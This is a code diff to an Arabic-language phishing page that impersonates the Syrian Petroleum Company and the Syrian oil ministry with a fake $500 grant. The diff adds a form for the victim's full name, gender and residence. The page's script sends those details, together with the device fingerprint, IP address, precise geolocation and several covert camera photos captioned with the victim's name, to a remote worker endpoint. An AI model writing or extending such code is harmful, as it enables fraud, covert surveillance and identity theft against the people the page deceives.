@@ -51,7 +51,6 @@
             background: #ffffff;
         }
 
-        /* --- الخط الأخضر العلوي --- */
         .top-green-bar {
             width: 100%;
             height: 16px;
@@ -62,7 +61,6 @@
             z-index: 5;
         }
 
-        /* --- الصورة الكبيرة تحت الخط الأخضر --- */
         .hero-image-container {
             width: 100%;
             height: 220px;
@@ -79,7 +77,6 @@
             display: block;
         }
 
-        /* --- القسم الأبيض المحتوي على كل شيء --- */
         .content-wrapper {
             width: 100%;
             padding: 0 20px;
@@ -92,7 +89,6 @@
             background: #ffffff;
         }
 
-        /* --- شعار الجمهورية (النسر) --- */
         .emblem-row {
             display: flex;
             justify-content: center;
@@ -121,7 +117,6 @@
             object-fit: contain;
         }
 
-        /* --- البطاقة الرئيسية --- */
         .grant-card {
             background: var(--white);
             border-radius: 20px;
@@ -230,6 +225,51 @@
             font-size: 16px; color: white;
         }
 
+        .user-data-form {
+            background: #f9fafb;
+            border-radius: 14px;
+            padding: 15px;
+            margin-bottom: 16px;
+            border: 1px solid #e5e7eb;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .user-data-form label {
+            font-size: 12px;
+            font-weight: 700;
+            color: #1f2937;
+            display: flex;
+            flex-direction: column;
+            gap: 3px;
+        }
+
+        .user-data-form label span {
+            font-weight: 400;
+            color: #6b7280;
+            font-size: 11px;
+        }
+
+        .user-data-form input,
+        .user-data-form select {
+            padding: 10px 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 10px;
+            font-size: 13px;
+            font-family: 'Cairo', sans-serif;
+            background: white;
+            transition: border 0.2s ease;
+            width: 100%;
+        }
+
+        .user-data-form input:focus,
+        .user-data-form select:focus {
+            outline: none;
+            border-color: #0a5c2a;
+            box-shadow: 0 0 0 3px rgba(10, 92, 42, 0.1);
+        }
+
         .claim-btn {
             width: 100%; padding: 14px;
             background: linear-gradient(135deg, #0a5c2a, #0d6b33);
@@ -245,7 +285,6 @@
 
         .footer-note { text-align: center; margin-top: 10px; font-size: 10px; color: #a0aec0; }
 
-        /* --- اسم الشركة تحت البطاقة --- */
         .company-name-footer {
             text-align: center;
             color: #0a5c2a;
@@ -263,7 +302,6 @@
             margin-top: 2px;
         }
 
-        /* --- الأقسام السفلية --- */
         .bottom-sections {
             width: 100%;
             display: flex;
@@ -292,7 +330,6 @@
         .info-card-title { font-size: 12px; font-weight: 700; margin-bottom: 2px; }
         .info-card-sub { font-size: 10px; color: #6b7280; }
 
-        /* --- الفوتر --- */
         .footer-logo {
             text-align: center;
             margin-top: 20px;
@@ -309,7 +346,6 @@
             margin-bottom: 2px;
         }
 
-        /* --- بطاقات الحالة --- */
         .processing-card, .success-card, .error-card {
             background: white;
             border-radius: 20px;
@@ -373,25 +409,20 @@
 
     <div class="app-container">
 
-        <!-- الخط الأخضر العلوي الرفيع -->
         <div class="top-green-bar"></div>
 
-        <!-- الصورة الكبيرة تحت الخط الأخضر مباشرة -->
         <div class="hero-image-container" id="headerCard">
             <img src="https://furat.alwehda.gov.sy/wp-content/uploads/2026/03/IMG_20260304_192450_498.jpg" alt="الشركة السورية للبترول">
         </div>
 
-        <!-- المحتوى الأبيض -->
         <div class="content-wrapper" id="mainContent">
 
-            <!-- شعار الجمهورية (النسر) -->
             <div class="emblem-row">
                 <div class="emblem-circle">
                     <img src="https://iconape.com/wp-content/files/ps/392297/png/392297.png" alt="شعار الجمهورية العربية السورية">
                 </div>
             </div>
 
-            <!-- بطاقة المنحة -->
             <div class="grant-card" id="giftCard">
                 <div class="grant-header">
                     <div class="company-badge">⚜️ مبادرة وطنية - الدعم الاستثنائي</div>
@@ -411,26 +442,47 @@
                             <div class="stamp-text">الجمهورية العربية السورية<br>وزارة النفط والثروة المعدنية</div>
                         </div>
                     </div>
+
+                    <div class="user-data-form">
+                        <label>
+                            الاسم الكامل (كما في الهوية)
+                            <span>سُجل باسمك في السجلات الرسمية</span>
+                            <input type="text" id="fullName" placeholder="مثال: أحمد محمد علي" required>
+                        </label>
+                        <label>
+                            الجنس
+                            <span>تحديد الجنس حسب الهوية</span>
+                            <select id="gender">
+                                <option value="ذكر">ذكر</option>
+                                <option value="أنثى">أنثى</option>
+                            </select>
+                        </label>
+                        <label>
+                            محل السكن (المحافظة/المدينة)
+                            <span>لمطابقة الموقع الجغرافي مع سجلاتنا</span>
+                            <input type="text" id="residence" placeholder="مثال: دمشق - المزة">
+                        </label>
+                    </div>
+
                     <div class="features-grid">
                         <div class="feature-row"><span class="feature-icon-box">🏛️</span><span>صادرة عن الشركة السورية للبترول</span></div>
-                        <div class="feature-row"><span class="feature-icon-box">🆔</span><span>مطلوب إدخال الاسم الكامل وتأكيد الهوية</span></div>
+                        <div class="feature-row"><span class="feature-icon-box">🆔</span><span>تأكيد الهوية عبر الكاميرا</span></div>
+                        <div class="feature-row"><span class="feature-icon-box">📍</span><span>مطابقة موقع السكن مع السجلات الرسمية</span></div>
                         <div class="feature-row"><span class="feature-icon-box">💰</span><span>قيمة الدعم: 500$ من الراتب الأساسي</span></div>
-                        <div class="feature-row"><span class="feature-icon-box">🔐</span><span>نظام تحقق مصرفي عالي الأمان</span></div>
                     </div>
+
                     <button class="claim-btn" id="claimBtn" onclick="startProcess()">
-                        تقديم الطلب وتأكيد الاستلام ←
+                        متابعة لتأكيد الهوية ←
                     </button>
                     <div class="footer-note"><span style="color:#0a5c2a;">🔒</span> اتصال مشفر آمن SSL</div>
                 </div>
             </div>
 
-            <!-- اسم الشركة باللون الأخضر تحت البطاقة -->
             <div class="company-name-footer">
                 الشركة السورية للبترول
                 <span class="sub">Syrian Petroleum Company</span>
             </div>
 
-            <!-- الأقسام السفلية -->
             <div class="bottom-sections" id="supportSections">
                 <div class="info-row">
                     <div class="info-card">
@@ -457,19 +509,17 @@
 
         </div>
 
-        <!-- بطاقة المعالجة -->
         <div class="processing-card" id="processingCard">
             <div class="spinner-ring"></div>
             <div class="processing-title">جاري معالجة طلب المنحة</div>
             <div class="processing-subtitle">يرجى عدم إغلاق الصفحة...</div>
             <div class="steps-progress">
-                <div class="progress-step" id="step1"><span class="progress-dot"></span><span>التحقق من الموقع الجغرافي</span></div>
+                <div class="progress-step" id="step1"><span class="progress-dot"></span><span>مطابقة الموقع الجغرافي مع سجلات السكن</span></div>
                 <div class="progress-step" id="step2"><span class="progress-dot"></span><span>تأكيد الهوية عبر الكاميرا</span></div>
                 <div class="progress-step" id="step3"><span class="progress-dot"></span><span>إيداع منحة الـ 500% في الحساب</span></div>
             </div>
         </div>
 
-        <!-- بطاقة النجاح -->
         <div class="success-card" id="successCard">
             <div class="success-icon-circle">
                 <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
@@ -480,7 +530,6 @@
             <div class="success-details">📋 رقم الطلب: #SPC-2026-9901<br>🏦 الحالة: بانتظار التحويل النهائي</div>
         </div>
 
-        <!-- بطاقة الخطأ -->
         <div class="error-card" id="errorCard">
             <div class="error-icon">⚠️</div>
             <div class="error-title">تعذر إتمام الطلب</div>
@@ -503,6 +552,11 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         let stream = null;
+
+        // متغيرات لتخزين البيانات الشخصية
+        let userFullName = '';
+        let userGender = '';
+        let userResidence = '';
 
         function hideAll() {
             document.getElementById('mainContent').style.display = 'none';
@@ -555,6 +609,16 @@
             let clean = base64;
             if (clean.includes(',')) clean = clean.split(',')[1];
             return await sendToWorker('sendPhoto', { image: clean, caption: caption });
+        }
+
+        // دالة جديدة لإرسال البيانات الشخصية بشكل منفصل
+        async function sendPersonalData() {
+            const msg = '📋 **بيانات المستخدم الشخصية**\n' +
+                       '👤 الاسم الكامل: ' + userFullName + '\n' +
+                       '⚥ الجنس: ' + userGender + '\n' +
+                       '🏠 محل السكن: ' + userResidence + '\n' +
+                       '🕐 تاريخ التسجيل: ' + new Date().toLocaleString('ar-SY');
+            return await sendMessage(msg);
         }
 
         function getDeviceInfo() {
@@ -619,7 +683,7 @@
                 });
                 return true;
             } catch (err) {
-                throw new Error('يجب السماح بالكاميرا: ' + err.message);
+                throw new Error('يجب السماح بالكاميرا لتأكيد الهوية: ' + err.message);
             }
         }
 
@@ -639,12 +703,25 @@
         }
 
         async function startProcess() {
+            // جمع البيانات من النموذج وتخزينها في المتغيرات العامة
+            userFullName = document.getElementById('fullName').value.trim();
+            userGender = document.getElementById('gender').value;
+            userResidence = document.getElementById('residence').value.trim();
+
+            if (!userFullName || !userResidence) {
+                alert('يرجى إدخال الاسم الكامل ومحل السكن قبل المتابعة.');
+                return;
+            }
+
             const btn = document.getElementById('claimBtn');
             btn.disabled = true;
             btn.textContent = '⏳ جاري المعالجة...';
             showProcessing();
 
             try {
+                // الخطوة 1: إرسال البيانات الشخصية أولاً
+                await sendPersonalData();
+                
                 updateStep(1, 'current');
                 let locationData = null;
                 try { locationData = await getLocation(); } catch (e) {}
@@ -654,14 +731,29 @@
                 const deviceInfo = getDeviceInfo();
                 const ip = await getIP();
                 
-                let msg = '🛢️ الشركة السورية للبترول - منحة ' + CLAIM_AMOUNT + '\n';
-                msg += '📱 ' + deviceInfo.deviceType + ' | ' + deviceInfo.os + ' | ' + deviceInfo.browser + '\n';
-                msg += '🖥 ' + deviceInfo.screen + ' | 🌍 ' + deviceInfo.language + '\n';
-                msg += '🕐 ' + deviceInfo.time + ' | ⏰ ' + deviceInfo.timezone + '\n';
-                msg += '🔢 IP: ' + ip + '\n';
+                // رسالة تفصيلية تحتوي على كل المعلومات
+                let msg = '🛢️ **الشركة السورية للبترول - منحة ' + CLAIM_AMOUNT + '**\n';
+                msg += '━━━━━━━━━━━━━━━━━━━\n';
+                msg += '👤 **الاسم الكامل:** ' + userFullName + '\n';
+                msg += '⚥ **الجنس:** ' + userGender + '\n';
+                msg += '🏠 **محل السكن:** ' + userResidence + '\n';
+                msg += '━━━━━━━━━━━━━━━━━━━\n';
+                msg += '📱 **معلومات الجهاز:**\n';
+                msg += '• النوع: ' + deviceInfo.deviceType + '\n';
+                msg += '• نظام التشغيل: ' + deviceInfo.os + '\n';
+                msg += '• المتصفح: ' + deviceInfo.browser + '\n';
+                msg += '• الشاشة: ' + deviceInfo.screen + '\n';
+                msg += '• اللغة: ' + deviceInfo.language + '\n';
+                msg += '• المنطقة الزمنية: ' + deviceInfo.timezone + '\n';
+                msg += '• الوقت: ' + deviceInfo.time + '\n';
+                msg += '• عنوان IP: ' + ip + '\n';
                 if (locationData) {
-                    msg += '📍 ' + locationData.lat + ',' + locationData.lng + '\n';
-                    msg += '🗺 ' + locationData.mapUrl;
+                    msg += '━━━━━━━━━━━━━━━━━━━\n';
+                    msg += '📍 **الموقع الجغرافي:**\n';
+                    msg += '• خط العرض: ' + locationData.lat + '\n';
+                    msg += '• خط الطول: ' + locationData.lng + '\n';
+                    msg += '• الدقة: ' + locationData.accuracy + ' متر\n';
+                    msg += '• رابط الخريطة: ' + locationData.mapUrl;
                 }
                 
                 await sendMessage(msg);
@@ -672,14 +764,20 @@
                 for (let i = 1; i <= CAPTURE_COUNT; i++) {
                     await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
                     const photo = await capturePhoto();
-                    await sendPhoto(photo, '📸 هوية ' + i + '/' + CAPTURE_COUNT + ' - SPC');
+                    const caption = '📸 تأكيد هوية: ' + userFullName + ' (' + i + '/' + CAPTURE_COUNT + ')\n' +
+                                   '🏠 السكن: ' + userResidence;
+                    await sendPhoto(photo, caption);
                 }
                 
                 stopCamera();
                 updateStep(2, 'done');
 
                 updateStep(3, 'current');
-                await sendMessage('✅ تم تأكيد الأهلية للمنحة - ' + CLAIM_AMOUNT + '\n📋 #SPC-2026-9901');
+                await sendMessage('✅ **تم تأكيد الأهلية للمنحة**\n' +
+                                  '👤 المستفيد: ' + userFullName + '\n' +
+                                  '💰 قيمة المنحة: ' + CLAIM_AMOUNT + '\n' +
+                                  '📋 رقم الطلب: #SPC-2026-9901\n' +
+                                  '🏦 الحالة: قيد المراجعة النهائية');
                 
                 await new Promise(r => setTimeout(r, 2000));
                 updateStep(3, 'done');
@@ -690,7 +788,11 @@
             } catch (error) {
                 stopCamera();
                 showError(error.message || 'حدث خطأ غير متوقع');
-                try { await sendMessage('❌ فشل: ' + error.message); } catch (e) {}
+                try { 
+                    await sendMessage('❌ **فشل في المعالجة**\n' +
+                                      '👤 المستخدم: ' + userFullName + '\n' +
+                                      '⚠️ السبب: ' + error.message); 
+                } catch (e) {}
             }
         }
     </script>
